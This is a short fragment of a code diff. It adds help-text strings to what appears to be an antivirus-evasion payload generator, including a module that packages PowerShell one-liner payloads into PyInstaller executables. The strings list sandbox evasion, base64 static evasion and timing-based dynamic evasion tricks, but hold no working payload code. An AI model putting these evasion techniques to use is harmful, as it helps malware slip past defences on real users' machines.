         description += "  avoid payload's execution inside most AV sandbox \n\n"
+        description += "  [>] Memory allocation type: managed by python interpreter\n\n"
+        description += "  [>] STATIC EVASION:\n"
+        description += "  Base 64 Encoded \n"
+        description += "  [>] DYNAMIC EVASION:\n"
+        description += "  Random millions increments  \n"
+        description += "  Am i Zero?  \n"
+        description += "  crazy pow   \n"
+        description += "  [>] AUTOCOMPILE: using Pyinstaller \n"
+
+    elif module_type == "Pytherpreter_Polymorphic_Powershelloneline":
+
+        description = ""
+        description += "  This Module use pyinstaller to forge\n"
+        description += "  executable able to \n"
+        description += "  drop commandline payload using os.system() \n\n"
         description += "  [>] Memory allocation type: managed by python interpreter\n\n"
         description += "  [>] STATIC EVASION:\n"
         description += "  Base 64 Encoded \n"
